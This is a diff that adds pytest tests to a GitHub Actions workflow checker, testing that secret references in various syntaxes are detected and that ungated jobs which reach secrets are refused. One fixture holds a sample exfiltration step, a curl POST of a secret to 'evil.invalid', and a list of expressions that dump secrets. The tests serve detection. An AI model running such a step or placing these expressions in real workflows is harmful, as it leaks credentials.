@@ -1513,3 +1513,74 @@ def test_panel_f3_evidence_only_delta_accepts_a_generator(tmp_path):
 def test_panel_f3_a_non_string_path_is_refused():
     with _refusal("closure_delta_path_not_a_string"):
         closure.evidence_only_delta(["audit/a.md", None])
+
+
+# --------------------------------------------------------------------------
+# Bootstrap PR review: the secret detector was a substring match.
+#
+# `secrets.` misses everything GitHub also supports. The dangerous direction is
+# not D0 naming a secret — it is a D1/D2 job REACHING one without being
+# recognised as credential-bearing, which escapes the environment gate and the
+# containment gate at the same time.
+# --------------------------------------------------------------------------
+
+SECRET_SYNTAXES = [
+    "${{ secrets.TRUSTED_VERIFIER_OPENAI_KEY }}",
+    "${{ secrets['TRUSTED_VERIFIER_OPENAI_KEY'] }}",
+    '${{ secrets["TRUSTED_VERIFIER_OPENAI_KEY"] }}',
+    "${{ toJSON(secrets) }}",
+    "${{ secrets[format('TRUSTED_{0}_KEY', 'VERIFIER')] }}",
+    "${{ fromJSON(toJSON(secrets)).TRUSTED_VERIFIER_OPENAI_KEY }}",
+]
+
+
+@pytest.mark.parametrize("expression", SECRET_SYNTAXES)
+def test_review_d0_may_not_name_a_secret_in_any_syntax(expression):
+    document = _document(D0)
+    document["jobs"]["d0-containment"]["steps"][0].setdefault("env", {})
+    document["jobs"]["d0-containment"]["steps"][0]["env"]["LEAK"] = expression
+    with _refusal("phase_must_not_name_a_secret"):
+        workflowfile.assert_phase_secret_policy(
+            document, name=D0, policy=workflowfile.TRUSTED_WORKFLOWS[D0])
+
+
+@pytest.mark.parametrize("expression", SECRET_SYNTAXES)
+def test_review_an_ungated_job_reaching_a_secret_is_detected(expression):
+    """The worse half of the bug.
+
+    A job the checker does not recognise as credential-bearing is never asked
+    for an `environment:` or a `needs:` — so it reaches the secret with neither
+    gate. `toJSON(secrets)` makes that one line and every secret at once."""
+    document = _document(D1)
+    document["jobs"]["exfiltrate"] = {
+        "runs-on": "ubuntu-latest",
+        "steps": [{"name": "leak", "env": {"K": expression},
+                   "run": "curl -X POST https://evil.invalid -d \"$K\""}],
+    }
+    with pytest.raises(errors.LaneRefusal) as excinfo:
+        workflowfile.assert_secret_containment(document)
+    assert ("secret_job_not_environment_gated" in excinfo.value.reason
+            or "secret_job_not_gated_behind_containment" in excinfo.value.reason)
+
+
+@pytest.mark.parametrize("expression", [
+    "${{ github.repository_id }}",
+    "${{ github.ref }}",
+    "${{ inputs.target_base_sha }}",
+    "${{ vars.TRUSTED_ENGINE_ARTIFACT_SHA256 }}",
+    "no expression at all",
+    "the word secrets outside an expression",
+    "${{ env.MY_secrets_LIKE_NAME }}",
+])
+def test_review_benign_expressions_are_not_flagged_as_secrets(expression):
+    """A detector that flags everything is a detector nobody keeps."""
+    assert workflowfile._secret_references({"env": {"V": expression}}) == []
+
+
+def test_review_the_detector_finds_the_context_by_identifier_not_by_substring():
+    assert workflowfile._secret_references(
+        {"a": "${{ secrets.X }}"}) == ["${{ secrets.X }}"]
+    assert workflowfile._secret_references(
+        {"a": "${{ toJSON(secrets) }}"}) == ["${{ toJSON(secrets) }}"]
+    # `foo.secrets` is not the secrets context.
+    assert workflowfile._secret_references({"a": "${{ foo.secrets }}"}) == []
